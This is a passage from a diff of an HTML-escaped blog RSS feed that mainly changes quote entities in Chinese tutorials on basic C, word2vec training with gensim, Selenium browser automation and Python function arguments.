+printf(&amp;#34;hallo world\n&amp;#34;); //打印固定字符串
+printf(&amp;#34;%d\n&amp;#34;,i); //打印单个数字
+printf(&amp;#34;你输入的x=%d,y=%d\n&amp;#34;,x,y);//格式化输出
+printf(&amp;#34;单精度a=%f;双精度b=%.3lf&amp;#34;,a,b);//打印输出浮点类型，并限制位数
+printf(&amp;#34;%c&amp;#34;,ch);//打印单个字符
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;ul>
@@ -1615,7 +1615,7 @@ return 0;
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align:left">\\&lt;/td>
-&lt;td style="text-align:left">代表一个反斜线字符'''&lt;/td>
+&lt;td style="text-align:left">代表一个反斜线字符&amp;rsquo;&amp;rsquo;'&lt;/td>
 &lt;td style="text-align:left">092 ​&lt;/td>
 &lt;/tr>
 &lt;tr>
@@ -1740,10 +1740,10 @@ return 0;
 &lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
 int main(){
 int x=0;
-printf(&amp;quot;%d\n&amp;quot;,x++);
-printf(&amp;quot;%d\n&amp;quot;,x);
-printf(&amp;quot;%d\n&amp;quot;,--x);
-printf(&amp;quot;%d\n&amp;quot;,x);
+printf(&amp;#34;%d\n&amp;#34;,x++);
+printf(&amp;#34;%d\n&amp;#34;,x);
+printf(&amp;#34;%d\n&amp;#34;,--x);
+printf(&amp;#34;%d\n&amp;#34;,x);
 return 0;
 }
 &lt;/code>&lt;/pre>样例输出
@@ -1948,12 +1948,12 @@ A^B = 0011 0001
 &lt;h3 id="基本if语句">基本if语句&lt;/h3>
 &lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
 int main(){
-if (1) printf(&amp;quot;hallo &amp;quot;);
+if (1) printf(&amp;#34;hallo &amp;#34;);
 if (true) {
-printf(&amp;quot;world&amp;quot;);
+printf(&amp;#34;world&amp;#34;);
 }
 int x=10;
-if (x) printf(&amp;quot;\n&amp;quot;);
+if (x) printf(&amp;#34;\n&amp;#34;);
 //求a,b,c种的最大值
 int a=5,b=2,c=3;
 int ans;
@@ -1968,10 +1968,10 @@ else{
 ans=c;
 }
 }
-printf(&amp;quot;a=%d,b=%d,c=%d\nMax=%d\n&amp;quot;,a,b,c,ans);
+printf(&amp;#34;a=%d,b=%d,c=%d\nMax=%d\n&amp;#34;,a,b,c,ans);
 // &amp;amp;&amp;amp;且 ||或
-if (a&amp;gt;b &amp;amp;&amp;amp; b&amp;gt;c) printf(&amp;quot;a\n&amp;quot;);
-if (a&amp;gt;b || b&amp;gt;c) printf(&amp;quot;b\n&amp;quot;);
+if (a&amp;gt;b &amp;amp;&amp;amp; b&amp;gt;c) printf(&amp;#34;a\n&amp;#34;);
+if (a&amp;gt;b || b&amp;gt;c) printf(&amp;#34;b\n&amp;#34;);
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;p>输出如下&lt;/p>
@@ -1990,11 +1990,11 @@ b
 &lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
 int main(){
 int a=1,b=2,c=3;
-if (a&amp;gt;b &amp;amp;&amp;amp; ++a) printf(&amp;quot;Yes\n&amp;quot;);
+if (a&amp;gt;b &amp;amp;&amp;amp; ++a) printf(&amp;#34;Yes\n&amp;#34;);
 //这里由于a&amp;gt;b不成立，所以a++不会被执行，所以a的值仍然为1,当然prinft语句也不会被执行
-if (a&amp;lt;b &amp;amp;&amp;amp; ++a) printf(&amp;quot;%d\n&amp;quot;,a);
+if (a&amp;lt;b &amp;amp;&amp;amp; ++a) printf(&amp;#34;%d\n&amp;#34;,a);
 //这里由于a&amp;lt;b成立，所以a++也会被执行，这里会运行输出a数值2
-if (b&amp;lt;c || ++b) printf(&amp;quot;%d\n&amp;quot;,b);
+if (b&amp;lt;c || ++b) printf(&amp;#34;%d\n&amp;#34;,b);
 // ||也是如此，由于b&amp;lt;c成立，于是b++也不会被执行，输出b的数值为2
 return 0;
 }
@@ -2008,9 +2008,9 @@ return 0;
 &lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
 int main(){
 int n;
-printf(&amp;quot;请输入一个数字：&amp;quot;);
-scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);
-(n&amp;gt;0)?printf(&amp;quot;正数\n&amp;quot;):printf(&amp;quot;负数\n&amp;quot;);
+printf(&amp;#34;请输入一个数字：&amp;#34;);
+scanf(&amp;#34;%d&amp;#34;,&amp;amp;n);
+(n&amp;gt;0)?printf(&amp;#34;正数\n&amp;#34;):printf(&amp;#34;负数\n&amp;#34;);
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;p>样例输入&lt;/p>
@@ -2021,10 +2021,10 @@ return 0;
 &lt;li>如上的三元运算符可以近似写成如下的if语句：&lt;/li>
 &lt;/ul>
 &lt;pre tabindex="0">&lt;code>if (n&amp;gt;0) {
-printf(&amp;quot;正数&amp;quot;);
+printf(&amp;#34;正数&amp;#34;);
 }
 else {
-printf(&amp;quot;负数&amp;quot;);
+printf(&amp;#34;负数&amp;#34;);
 }
 &lt;/code>&lt;/pre>&lt;hr>
 &lt;/li>
@@ -2033,13 +2033,13 @@ printf(&amp;quot;负数&amp;quot;);
 &lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
 int main(){
 int n;
-printf(&amp;quot;请输入一个数字：&amp;quot;);
-scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);
+printf(&amp;#34;请输入一个数字：&amp;#34;);
+scanf(&amp;#34;%d&amp;#34;,&amp;amp;n);
 switch (n){
-case 1: printf(&amp;quot;this is case 1\n&amp;quot;);
-case 2: printf(&amp;quot;this is case 2\n&amp;quot;); break;
+case 1: printf(&amp;#34;this is case 1\n&amp;#34;);
+case 2: printf(&amp;#34;this is case 2\n&amp;#34;); break;
 default:
-printf(&amp;quot;this is default\n&amp;quot;);
+printf(&amp;#34;this is default\n&amp;#34;);
 }
 return 0;
 }
@@ -2082,7 +2082,7 @@ int ans=0;
 for (i=0;i&amp;lt;=100;i++){
 ans=ans+i;
 }
-printf(&amp;quot;%d\n&amp;quot;,ans);
+printf(&amp;#34;%d\n&amp;#34;,ans);
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
@@ -2099,7 +2099,7 @@ statement(s);
 &lt;li>条件再次被判断。如果为真，则执行循环，这个过程会不断重复（循环主体，然后增加步值，再然后重新判断条件）。在条件变为假时，for 循环终止。&lt;/li>
 &lt;/ul>
 &lt;p>在VC 6.0中不支持在init中声明循环控制变量，只允许使用上面的样例代码，否则会有&lt;/p>
-&lt;pre tabindex="0">&lt;code>[Error] 'for' loop initial declarations are only allowed in C99 or C11 mode
+&lt;pre tabindex="0">&lt;code>[Error] &amp;#39;for&amp;#39; loop initial declarations are only allowed in C99 or C11 mode
 &lt;/code>&lt;/pre>&lt;p>错误，在比较新版本的编译器中，如下写法是被支持的&lt;/p>
 &lt;pre tabindex="0">&lt;code>for (int i=0;i&amp;lt;=100;i++) {
 ans=ans+1;
@@ -2187,7 +2187,7 @@ return ret;
 }
 int main() {
 int a=10,b=20;
-printf(&amp;quot;%d\n&amp;quot;,Max(a,b));
+printf(&amp;#34;%d\n&amp;#34;,Max(a,b));
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
@@ -2212,9 +2212,9 @@ b=t;
 }
 int main(){
 int a=10,b=20;
-printf(&amp;quot;a=%d,b=%d\n&amp;quot;,a,b);
+printf(&amp;#34;a=%d,b=%d\n&amp;#34;,a,b);
 swap(a,b);
-printf(&amp;quot;a=%d,b=%d\n&amp;quot;,a,b);
+printf(&amp;#34;a=%d,b=%d\n&amp;#34;,a,b);
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
@@ -2239,9 +2239,9 @@ int t=*a;
 }
 int main(){
 int a=10,b=20;
-printf(&amp;quot;a=%d,b=%d\n&amp;quot;,a,b);
+printf(&amp;#34;a=%d,b=%d\n&amp;#34;,a,b);
 swap(&amp;amp;a,&amp;amp;b);
-printf(&amp;quot;a=%d,b=%d\n&amp;quot;,a,b);
+printf(&amp;#34;a=%d,b=%d\n&amp;#34;,a,b);
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
@@ -2270,17 +2270,17 @@ a=20,b=10
 //全局变量
 int g=10;
 void func1(int g){
-printf(&amp;quot;in func1 g=%d\n&amp;quot;,g);
+printf(&amp;#34;in func1 g=%d\n&amp;#34;,g);
 return;
 }
 void func2(){
-printf(&amp;quot;in func2 g=%d\n&amp;quot;,g);
+printf(&amp;#34;in func2 g=%d\n&amp;#34;,g);
 return;
 }
 int main(){
 //局部变量
 int x=20,g=30;
-printf(&amp;quot;in main x=%d,g=%d\n&amp;quot;,x,g);
+printf(&amp;#34;in main x=%d,g=%d\n&amp;#34;,x,g);
 func1(x);//我们把x=20的值赋值给形式参数g
 func2();
 return 0;
@@ -2402,7 +2402,7 @@ for (int i=0;i&amp;lt;100;i++){
 ans+=a[i];
 }
 //样例输出5050
-printf(&amp;quot;%d\n&amp;quot;,ans);
+printf(&amp;#34;%d\n&amp;#34;,ans);
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;hr>
@@ -2427,7 +2427,7 @@ int main(){
 //声明初始化一个数组a
 int a[5]={1,2,3,4,5};
 //打印平均值
-printf(&amp;quot;%lf\n&amp;quot;,func(a,5));/
+printf(&amp;#34;%lf\n&amp;#34;,func(a,5));/
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;ul>
@@ -2452,7 +2452,7 @@ return 0;
 int main(){
 int a[10]={0};
 for(int i=0;i&amp;lt;=10;i++)
-printf(&amp;quot;%d &amp;quot;,a[i]);
+printf(&amp;#34;%d &amp;#34;,a[i]);
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
@@ -2493,16 +2493,16 @@ return 0;
 还记的\0吗，截止符
 字符数组内存储的字符串的末尾必须有截止符！
 */
-char name[6]={'h', 'e', 'l', 'l', 'o', '\0'};
+char name[6]={&amp;#39;h&amp;#39;, &amp;#39;e&amp;#39;, &amp;#39;l&amp;#39;, &amp;#39;l&amp;#39;, &amp;#39;o&amp;#39;, &amp;#39;\0&amp;#39;};
 //你还可以用这个写法.
-char greeting[]=&amp;quot;hello&amp;quot;;
+char greeting[]=&amp;#34;hello&amp;#34;;
 //初始化部分元素也是可以滴
-char name[20]=&amp;quot;xiaoming&amp;quot;;
+char name[20]=&amp;#34;xiaoming&amp;#34;;
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>字符数组的遍历&lt;/p>
 &lt;p>因为字符串数组末尾必定有截止符的特性，我们有了一些常用的遍历字符数组的方法：&lt;/p>
-&lt;pre tabindex="0">&lt;code>char str[]=&amp;quot;hello world&amp;quot;;
+&lt;pre tabindex="0">&lt;code>char str[]=&amp;#34;hello world&amp;#34;;
 for (int i=0;str[i]!=0;i++){
 ···
 }
@@ -2518,10 +2518,10 @@ i++;
 &lt;pre tabindex="0">&lt;code>char str[100];
 //输入字符串
 gets(str);
-scanf(&amp;quot;%s&amp;quot;,&amp;amp;str);
+scanf(&amp;#34;%s&amp;#34;,&amp;amp;str);
 //输出字符串
 puts(str);
-printf(&amp;quot;%s\n&amp;quot;,str);
+printf(&amp;#34;%s\n&amp;#34;,str);
 /*
 之前说到在数组处理，越界并不会被报错
 所以这里的输入都存在着极大的安全隐患，于是在Visual studio的最新版本里，出于安全考虑
@@ -2584,9 +2584,9 @@ printf(&amp;quot;%s\n&amp;quot;,str);
 &lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
 #include&amp;lt;string.h&amp;gt;
 int main(){
-char name[]=&amp;quot;xiaoming&amp;quot;;
-printf(&amp;quot;size of name=%d\n&amp;quot;,sizeof(name));
-printf(&amp;quot;strlen of name=%d\n&amp;quot;,strlen(name));
+char name[]=&amp;#34;xiaoming&amp;#34;;
+printf(&amp;#34;size of name=%d\n&amp;#34;,sizeof(name));
+printf(&amp;#34;strlen of name=%d\n&amp;#34;,strlen(name));
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
@@ -2602,9 +2602,9 @@ strlen of name=8
 &lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
 #include&amp;lt;string.h&amp;gt;
 int main(){
-char name[20]=&amp;quot;xiaoming&amp;quot;;
-printf(&amp;quot;size of name=%d\n&amp;quot;,sizeof(name));
-printf(&amp;quot;strlen of name=%d\n&amp;quot;,strlen(name));
+char name[20]=&amp;#34;xiaoming&amp;#34;;
+printf(&amp;#34;size of name=%d\n&amp;#34;,sizeof(name));
+printf(&amp;#34;strlen of name=%d\n&amp;#34;,strlen(name));
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;/li>
@@ -2640,21 +2640,21 @@ DATE date; //出生年月，对!结构体也可以嵌套定义
 //对，我们要存储一个班的学生，50人
 StudentInfo student[50];
 for (int i=0;i&amp;lt;50;i++){
-printf(&amp;quot;输入第%d个学生信息：\n&amp;quot;,i+1);
+printf(&amp;#34;输入第%d个学生信息：\n&amp;#34;,i+1);
 //我们使用结构体名称加“.”的方式来访问结构体内部元素
-printf(&amp;quot;学生姓名：&amp;quot;); scanf(&amp;quot;%s&amp;quot;,&amp;amp;student[i].name);
-printf(&amp;quot;学生出生年月日：&amp;quot;);
+printf(&amp;#34;学生姓名：&amp;#34;); scanf(&amp;#34;%s&amp;#34;,&amp;amp;student[i].name);
+printf(&amp;#34;学生出生年月日：&amp;#34;);
 scanf(
-&amp;quot;%d-%d-%d&amp;quot;,
+&amp;#34;%d-%d-%d&amp;#34;,
 &amp;amp;student[i].date.year,
 &amp;amp;student[i].date.month,
 &amp;amp;student[i].date.day
 );
 };
 for (int i=0;i&amp;lt;50;i++){
-printf(&amp;quot;%s\n&amp;quot;,student[i].name);
+printf(&amp;#34;%s\n&amp;#34;,student[i].name);
 printf(
-&amp;quot;%d-%d-%d&amp;quot;,
+&amp;#34;%d-%d-%d&amp;#34;,
 student[i].date.year,
 student[i].date.month,
 student[i].date.day
@@ -2800,9 +2800,9 @@ int a; //声明一个正常整形变量
 a=1; //将a赋值为1
 p=&amp;amp;a; //将a的地址赋值给指针变量
 //&amp;amp; 符号，取变量的地址
-printf(&amp;quot;a=%d\np=%p\n*p=%d&amp;quot;,a,p,*p);
+printf(&amp;#34;a=%d\np=%p\n*p=%d&amp;#34;,a,p,*p);
 a=22; //改变a的值
-printf(&amp;quot;\na=%d\np=%p\n*p=%d&amp;quot;,a,p,*p);
+printf(&amp;#34;\na=%d\np=%p\n*p=%d&amp;#34;,a,p,*p);
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;ul>
@@ -2829,12 +2829,12 @@ p=000000000062FE44 //同上
 char buff[100]; //声明一个字符串数组
 char ch; //声明一个字符变量
 int x; //声明一个整形变量
-f=fopen(&amp;quot;test.txt&amp;quot;,&amp;quot;wr&amp;quot;); //打开文件，“wr”指定可读可写
+f=fopen(&amp;#34;test.txt&amp;#34;,&amp;#34;wr&amp;#34;); //打开文件，“wr”指定可读可写
 ch=fgetc(f); //从文件中读取单个字符赋值给ch
-fscanf(f,&amp;quot;%s&amp;quot;,buff); //从文件中读取字符串赋值给buff字符串数组
-fscanf(f,&amp;quot;%d&amp;quot;,&amp;amp;x); //从文件中读取一个整形变量
+fscanf(f,&amp;#34;%s&amp;#34;,buff); //从文件中读取字符串赋值给buff字符串数组
+fscanf(f,&amp;#34;%d&amp;#34;,&amp;amp;x); //从文件中读取一个整形变量
 fgets(buff,100,f); //从文件中读取字符串，并存放到buff中，指定最大长度100
-fprintf(f,&amp;quot;%s\n&amp;quot;,buff); //向文件中写入字符串数组
+fprintf(f,&amp;#34;%s\n&amp;#34;,buff); //向文件中写入字符串数组
 fputc(ch,f); //向文件中写入单个字符
 fputs(buff,f); //向文件中写入字符串
 &lt;/code>&lt;/pre>&lt;h2 id="后记">后记&lt;/h2>
@@ -2903,12 +2903,12 @@ pip install gensim
 &lt;li>
 &lt;p>数据预处理&lt;/p>
 &lt;pre tabindex="0">&lt;code>def load():
-with open(&amp;quot;./train.tsv&amp;quot;,&amp;quot;r&amp;quot;,encoding=&amp;quot;utf-8&amp;quot;) as f:
+with open(&amp;#34;./train.tsv&amp;#34;,&amp;#34;r&amp;#34;,encoding=&amp;#34;utf-8&amp;#34;) as f:
 lines=f.readlines()
 f.close()
 return lines
 return None
-&lt;/code>&lt;/pre>&lt;p>这里采用的数据格式是以'\t&amp;rsquo;分割的tsv文件,每一行包含一个句子以及其对应标签.这里将二者共同训练&lt;/p>
+&lt;/code>&lt;/pre>&lt;p>这里采用的数据格式是以&amp;rsquo;\t&amp;rsquo;分割的tsv文件,每一行包含一个句子以及其对应标签.这里将二者共同训练&lt;/p>
 &lt;/li>
 &lt;li>
 &lt;p>分词并去除停止词&lt;/p>
@@ -2920,7 +2920,7 @@ return None
 import jieba
 # 读取停止词表函数,停止词表为一行一个的格式
 def load_stopwords():
-with open(&amp;quot;./stopwords.txt&amp;quot;,&amp;quot;r&amp;quot;,encoding=&amp;quot;utf-8&amp;quot;) as f:
+with open(&amp;#34;./stopwords.txt&amp;#34;,&amp;#34;r&amp;#34;,encoding=&amp;#34;utf-8&amp;#34;) as f:
 words=f.readlines()
 f.close()
 return words
@@ -2929,15 +2929,15 @@ return None
 stopowrds=load_stopwords()
 # 分词去除停止词函数,lines为上一步中读取的单行数据,将所有的分词保存到文本文件中为下一步训练备用
 def cut(lines):
-with open(&amp;quot;cutwords.txt&amp;quot;,&amp;quot;w+&amp;quot;,encoding=&amp;quot;utf-8&amp;quot;) as f:
+with open(&amp;#34;cutwords.txt&amp;#34;,&amp;#34;w+&amp;#34;,encoding=&amp;#34;utf-8&amp;#34;) as f:
 for line in lines:
 words=jieba.cut(line)
 #去除停止词
 for i in words:
 if i in stopwords:
 words.remove(i)
-f.write(&amp;quot; &amp;quot;.join(words))
-f.wirte(&amp;quot;\n&amp;quot;)
+f.write(&amp;#34; &amp;#34;.join(words))
+f.wirte(&amp;#34;\n&amp;#34;)
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>模型训练&lt;/p>
@@ -2952,7 +2952,7 @@ window_in=5, # 滑动窗口大小,涉及到单个词语关联前后单词的数�
 min_count_in=2, # 字典截断,出现次数少于该数值的词汇会被放弃
 iter_in=5 # 迭代次数
 ):
-print(&amp;quot;start traing...&amp;quot;)
+print(&amp;#34;start traing...&amp;#34;)
 model=word2vec.Word2Vec(
 sentences=sentence_in,
 size=size_in,
@@ -2961,35 +2961,35 @@ min_count=min_count_in,
 workers=multiprocessing.cpu_count(),
 iter=iter_in
 )
-print(&amp;quot;traing complete...&amp;quot;)
+print(&amp;#34;traing complete...&amp;#34;)
 return model
 # 从之前完成分词的数据中装载训练数据,模型sentence参数可以是一个list
 # 但是大批量数据时建议使用word2vec自带的类型导入
-sentence=LineSentence(&amp;quot;./cutwords.txt&amp;quot;)
+sentence=LineSentence(&amp;#34;./cutwords.txt&amp;#34;)
 model=model_train(sentence,300,5,2,5)
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>保存模型&lt;/p>
 &lt;pre tabindex="0">&lt;code># 参数为保存的文件名
-model.save(&amp;quot;modeltest&amp;quot;)
+model.save(&amp;#34;modeltest&amp;#34;)
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>模型的二次训练&lt;/p>
 &lt;pre tabindex="0">&lt;code># 读取模型
-model = gensim.models.Word2Vec.load('modeltest')
+model = gensim.models.Word2Vec.load(&amp;#39;modeltest&amp;#39;)
 # 追加训练
 model.train(more_sentences)
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>模型使用&lt;/p>
 &lt;pre tabindex="0">&lt;code># 根据给定的词汇给出10个最相近的词汇
-model.most_similar(&amp;quot;男人&amp;quot;)
+model.most_similar(&amp;#34;男人&amp;#34;)
 # 找出离群词
-model.doesnt_match(&amp;quot;测试&amp;quot;)
+model.doesnt_match(&amp;#34;测试&amp;#34;)
 # 计算两个词汇相似度
-model.similarity('男人', '女人')
+model.similarity(&amp;#39;男人&amp;#39;, &amp;#39;女人&amp;#39;)
 # 获得单个词汇的词向量
-model['男人']
+model[&amp;#39;男人&amp;#39;]
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;/ol></description></item><item><title>高阶爬虫selenium摘记</title><link>https://blog.yuukisama.cc/p/%E9%AB%98%E9%98%B6%E7%88%AC%E8%99%ABselenium%E6%91%98%E8%AE%B0/</link><pubDate>Fri, 08 Mar 2019 14:46:18 +0000</pubDate><guid>https://blog.yuukisama.cc/p/%E9%AB%98%E9%98%B6%E7%88%AC%E8%99%ABselenium%E6%91%98%E8%AE%B0/</guid><description>&lt;h2 id="概述">概述&lt;/h2>
 &lt;ul>
@@ -3051,7 +3051,7 @@ from selenium import webdriver
 # 声明一个chrome对象
 dirver=webdriver.Chrome()
 # 用chrome打开百度首页
-driver.get(&amp;quot;https://www.baidu.com/&amp;quot;)
+driver.get(&amp;#34;https://www.baidu.com/&amp;#34;)
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>&lt;a class="link" href="https://blog.csdn.net/yj1556492839/article/details/79671008" target="_blank" rel="noopener"
@@ -3069,11 +3069,11 @@ from selenium import webdirver
 # 声明一个chrome设置对象
 options=webdriver.ChromeOptions()
 # 指定浏览器可执行文件路径
-options._binary_location=&amp;quot;./Application/chrome.exe&amp;quot;
+options._binary_location=&amp;#34;./Application/chrome.exe&amp;#34;
 # 利用chrome设置对形象作为参数初始化webdriver对象,executable_path即webdriver路径
-chrome=webdriver.Chrome(chrome_options=options,executable_path=&amp;quot;./chromedriver.exe&amp;quot;)
+chrome=webdriver.Chrome(chrome_options=options,executable_path=&amp;#34;./chromedriver.exe&amp;#34;)
 # 打开百度首页
-chrome.get(&amp;quot;https://www.baidu.com/&amp;quot;)
+chrome.get(&amp;#34;https://www.baidu.com/&amp;#34;)
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;/ol>
 &lt;ul>
@@ -3090,29 +3090,29 @@ from selenium import webdirver
 # 声明一个chrome设置对象
 options=webdriver.ChromeOptions()
 # 禁用gpu加速
-options.add_argument(&amp;quot;--disable-gpu&amp;quot;)
+options.add_argument(&amp;#34;--disable-gpu&amp;#34;)
 # 允许加载不安全内容
-options.add_argument('--allow-running-insecure-content')
+options.add_argument(&amp;#39;--allow-running-insecure-content&amp;#39;)
 # 禁用插件
-options.add_argument('--disable-extensions')
+options.add_argument(&amp;#39;--disable-extensions&amp;#39;)
 # 使用无头浏览器,即不显示浏览器图形化界面,适用于没有图形化界面的服务器
-options.add_argument('--headless')
+options.add_argument(&amp;#39;--headless&amp;#39;)
 chrome=webdriver.Chrome(chrome_options=options)
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>实验性参数&lt;/p>
 &lt;pre tabindex="0">&lt;code>appState = {
-&amp;quot;recentDestinations&amp;quot;: [ {
-&amp;quot;id&amp;quot;: &amp;quot;Save as PDF&amp;quot;,
-&amp;quot;origin&amp;quot;: &amp;quot;local&amp;quot;
+&amp;#34;recentDestinations&amp;#34;: [ {
+&amp;#34;id&amp;#34;: &amp;#34;Save as PDF&amp;#34;,
+&amp;#34;origin&amp;#34;: &amp;#34;local&amp;#34;
 } ],
-&amp;quot;selectedDestinationId&amp;quot;: &amp;quot;Save as PDF&amp;quot;,
-&amp;quot;version&amp;quot;: 2
+&amp;#34;selectedDestinationId&amp;#34;: &amp;#34;Save as PDF&amp;#34;,
+&amp;#34;version&amp;#34;: 2
 }
 profile = {
-'printing.print_preview_sticky_settings.appState': json.dumps(appState)
+&amp;#39;printing.print_preview_sticky_settings.appState&amp;#39;: json.dumps(appState)
 }
-options.add_experimental_option(&amp;quot;prefs&amp;quot;,profile)
+options.add_experimental_option(&amp;#34;prefs&amp;#34;,profile)
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>&lt;a class="link" href="https://peter.sh/experiments/chromium-command-line-switches/" target="_blank" rel="noopener"
@@ -3127,11 +3127,11 @@ from selenium import webdirver
 chrome=webdriver.Chrome()
 # 设置js代码执行超时时间
 chrome.set_script_timeout(30)
-chrome.get(&amp;quot;http://www.baidu.com/&amp;quot;)
+chrome.get(&amp;#34;http://www.baidu.com/&amp;#34;)
 # 异步执行js代码
-chrome.execute_script(&amp;quot;alert(&amp;quot;Halloworld&amp;quot;);&amp;quot;)
+chrome.execute_script(&amp;#34;alert(&amp;#34;Halloworld&amp;#34;);&amp;#34;)
 # 阻塞执行js代码
-chrome.execute_async_script(&amp;quot;alert(&amp;quot;halloworld&amp;quot;);&amp;quot;)
+chrome.execute_async_script(&amp;#34;alert(&amp;#34;halloworld&amp;#34;);&amp;#34;)
 &lt;/code>&lt;/pre>&lt;ul>
 &lt;li>execute_script函数是异步执行js代码.&lt;/li>
 &lt;li>execute_async_script是阻塞执行,即会等待js执行完成再执行接下来的程序.&lt;/li>
@@ -3176,8 +3176,8 @@ WORK_PATH,FILE_NAME=os.path.split(os.path.abspath(__file__))
 &lt;ul>
 &lt;li>有时我们需要获取用户默认的下载目录,或者是文档目录等等
 &lt;pre tabindex="0">&lt;code>import os
-USER_PATH=os.path.expanduser(&amp;quot;~&amp;quot;)
-DOWNLOAD_PATH=ps.path.join(os.path.expanduser(&amp;quot;~&amp;quot;),&amp;quot;Download&amp;quot;)
+USER_PATH=os.path.expanduser(&amp;#34;~&amp;#34;)
+DOWNLOAD_PATH=ps.path.join(os.path.expanduser(&amp;#34;~&amp;#34;),&amp;#34;Download&amp;#34;)
 &lt;/code>&lt;/pre>&lt;ul>
 &lt;li>USER_PATH中存储了用户目录的绝对路径&lt;/li>
 &lt;li>DOWNLOAD_PATH中存储了用户默认下载目录(如果用户没有自己重命名这个文件夹的话)&lt;/li>
@@ -3196,10 +3196,10 @@ DOWNLOAD_PATH=ps.path.join(os.path.expanduser(&amp;quot;~&amp;quot;),&amp;quot;D
 &lt;li>
 &lt;p>*args用来表示函数接受可变长度的 &lt;strong>非关键字&lt;/strong> 参数作为函数的输入&lt;/p>
 &lt;pre tabindex="0">&lt;code>def test(normal_arg, *args):
-print(&amp;quot;first normal arg:&amp;quot;+normal_arg)
+print(&amp;#34;first normal arg:&amp;#34;+normal_arg)
 for i,x in enumerate(args):
-print(&amp;quot;{} arg is {}&amp;quot;.format(i+1,x))
-test(&amp;quot;normal&amp;quot;,&amp;quot;a&amp;quot;,&amp;quot;b&amp;quot;,&amp;quot;c&amp;quot;,&amp;quot;d&amp;quot;)
+print(&amp;#34;{} arg is {}&amp;#34;.format(i+1,x))
+test(&amp;#34;normal&amp;#34;,&amp;#34;a&amp;#34;,&amp;#34;b&amp;#34;,&amp;#34;c&amp;#34;,&amp;#34;d&amp;#34;)
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>样例输出&lt;/p>
@@ -3218,11 +3218,11 @@ test(&amp;quot;normal&amp;quot;,&amp;quot;a&amp;quot;,&amp;quot;b&amp;quot;,&amp
 &lt;pre tabindex="0">&lt;code>def test(**kwargs):
 if kwargs is not None:
 for key, value in kwargs.iteritems():
-print(&amp;quot;{} = {}&amp;quot;.format(key,value))
+print(&amp;#34;{} = {}&amp;#34;.format(key,value))
 # Or you can visit kwargs like a dict() object
 # for key in kwargs:
-# print(&amp;quot;{} = {}&amp;quot;.format(key, kwargs[key]))
-test(name=&amp;quot;python&amp;quot;, value=&amp;quot;5&amp;quot;)
+# print(&amp;#34;{} = {}&amp;#34;.format(key, kwargs[key]))
+test(name=&amp;#34;python&amp;#34;, value=&amp;#34;5&amp;#34;)
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>样例输出
 &lt;pre tabindex="0">&lt;code>name = python
@@ -3236,13 +3236,13 @@ value = 5
 &lt;li>
 &lt;p>我们也可以使用这两个参数来调用一般参数格式的函数&lt;/p>
 &lt;pre tabindex="0">&lt;code>def func(arg1,arg2,arg3):
-print(&amp;quot;arg1: &amp;quot; + arg1)
-print(&amp;quot;arg2: &amp;quot; + arg2)
-print(&amp;quot;arg3: &amp;quot; + arg3)
-args_list=(&amp;quot;python&amp;quot;,2,3)
+print(&amp;#34;arg1: &amp;#34; + arg1)
+print(&amp;#34;arg2: &amp;#34; + arg2)
+print(&amp;#34;arg3: &amp;#34; + arg3)
+args_list=(&amp;#34;python&amp;#34;,2,3)
 func(*args_list)
-print(&amp;quot;==================&amp;quot;)
-kwargs_dict={&amp;quot;arg3&amp;quot;: 3, &amp;quot;arg1&amp;quot;: &amp;quot;python&amp;quot;, &amp;quot;arg2&amp;quot;: 2}
+print(&amp;#34;==================&amp;#34;)
+kwargs_dict={&amp;#34;arg3&amp;#34;: 3, &amp;#34;arg1&amp;#34;: &amp;#34;python&amp;#34;, &amp;#34;arg2&amp;#34;: 2}
 func(**kwargs_dict)
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
@@ -3346,8 +3346,8 @@ return 0;
 using namespace std;
 int main(){
 char buffer[4096]={0}; //用于文件读取
-system(&amp;quot;.\\child.exe argv1 argv2 argv3 &amp;gt;&amp;gt;.\\result.txt&amp;quot;);//执行子程序并传入参数
-fstream file(&amp;quot;.\\result.txt&amp;quot;); //读取结果文件
+system(&amp;#34;.\\child.exe argv1 argv2 argv3 &amp;gt;&amp;gt;.\\result.txt&amp;#34;);//执行子程序并传入参数
+fstream file(&amp;#34;.\\result.txt&amp;#34;); //读取结果文件
 while(file.is_open() &amp;amp;&amp;amp; !file.eof()){
 file.read(buffer,4096);
